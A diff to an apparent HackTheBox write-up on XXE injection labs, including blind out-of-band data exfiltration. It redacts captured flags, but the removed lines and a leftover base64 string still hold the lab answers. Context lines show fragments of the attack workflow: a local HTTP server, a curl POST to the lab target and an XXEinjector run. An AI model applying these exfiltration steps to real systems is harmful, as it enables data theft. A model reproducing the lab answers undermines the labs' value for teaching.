@@ -584,7 +584,7 @@ python3 -m http.server 8000
 </root>
 ```
 
-**🎯 Flag:** `HTB{3rr0r5_c4n_l34k_d474}`
+**🎯 Flag:** `HTB{...}`
 
 ### Lab 3: Blind OOB Data Exfiltration
 
@@ -639,7 +639,7 @@ curl -X POST "http://10.129.234.170/blind/submitDetails.php" \
 ```bash
 echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d
 
-# Output: <?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
+# Output: <?php $flag = "HTB{...}"; ?>
 ```
 
 #### Automated XXEinjector Method
@@ -674,7 +674,7 @@ ruby XXEinjector.rb \
 cat Logs/10.129.234.170/327a6c4304ad5938eaf0efb6cc3e53dc.php.log
 ```
 
-**🎯 Flag:** `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`
+**🎯 Flag:** `HTB{...}`
 
 ---
 
